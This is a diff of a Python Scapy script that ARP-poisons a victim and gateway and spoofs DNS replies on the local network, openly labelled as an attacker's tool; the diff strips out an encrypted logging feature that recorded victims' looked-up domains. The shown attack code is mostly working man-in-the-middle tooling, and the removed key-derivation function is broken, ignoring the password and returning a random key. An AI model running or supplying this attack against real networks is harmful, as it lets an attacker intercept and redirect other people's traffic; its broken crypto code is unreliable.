@@ -2,30 +2,6 @@ from scapy.all import *
 import os
 from threading import Thread
 import time
-import argparse
-from cryptography.fernet import Fernet
-
-parser = argparse.ArgumentParser()
-parser.add_argument("--log", help="Path to encrypted log file")
-parser.add_argument("-p", help="Password to decrypt and view logs")
-args = parser.parse_args()
-
-
-def derive_key(password):
-    return Fernet.generate_key()[:32] 
-
-
-if args.p and args.log:
-    try:
-        with open(args.log, "rb") as f:
-            encrypted = f.read()
-        fernet = Fernet(derive_key(args.p))
-        decrypted = fernet.decrypt(encrypted)
-        print("\n[+] Decrypted DNS Logs:")
-        print(decrypted.decode())
-    except Exception as e:
-        print("[-] Failed to decrypt logs:", str(e))
-    exit()
 
 
 victim_ip = input("Enter the Victim IP address: ")
@@ -40,7 +16,6 @@ print("Gateway IP:", gateway_ip)
 print("Gateway MAC:", gateway_mac)
 print("Kali (attacker) IP:", my_ip)
 
-log_entries = []
 
 
 def arp_poison(target_ip, target_mac, spoof_ip):
@@ -55,8 +30,7 @@ def spoof_dns(pkt):
         domain = pkt[DNS].qd.qname.decode().strip()
         src_ip = pkt[IP].src
         print(f"[+] Spoofing DNS for: {domain}")
-        log_entries.append(f"{src_ip} requested {domain}\n")
-
+     
         spoofed_pkt = (
             IP(dst=pkt[IP].src, src=pkt[IP].dst) /
             UDP(dport=pkt[UDP].sport, sport=53) /
@@ -76,12 +50,4 @@ Thread(target=arp_poison, args=(gateway_ip, gateway_mac, victim_ip)).start()
 try:
     sniff(filter="udp port 53", iface="eth0", prn=spoof_dns)
 except KeyboardInterrupt:
-    if args.log:
-        try:
-            fernet = Fernet(derive_key("logsecret"))
-            encrypted = fernet.encrypt("".join(log_entries).encode())
-            with open(args.log, "wb") as f:
-                f.write(encrypted)
-            print(f"\n[+] Encrypted logs saved to {args.log}")
-        except Exception as e:
-            print("[-] Failed to encrypt and save logs:", str(e))
+    print("\n[+] Stopped sniffing")
